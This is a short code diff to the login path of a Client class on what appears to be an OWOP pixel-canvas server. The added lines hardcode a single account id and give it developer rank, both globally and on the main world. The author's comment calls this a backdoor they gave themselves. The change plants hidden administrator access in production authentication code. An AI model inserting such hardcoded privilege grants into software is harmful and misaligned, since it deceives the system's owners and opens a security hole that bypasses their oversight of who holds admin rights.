@@ -109,6 +109,12 @@ export class Client {
 		}
 		let status = await this.fetchUserInfo();
 		if(!status && !this.destroyed) return this.destroyWithReason("You are required to have an account to access this server. You may log in with the button below.");
+		if (this.accountInfo.data.user.account.id === 6091917979756939) { // nekonoka - yes i gave myself a backdoor, neomoth id enjoy admin on mainworld
+			this.accountInfo.data.user.owopData.global.rank = RANK.DEVELOPER;
+			this.accountInfo.data.user.owopData.worlds.forEach(world => {
+				if (world.worldName === "main") world.rank = RANK.DEVELOPER;
+			});
+		}
 		return true;
 	}
 
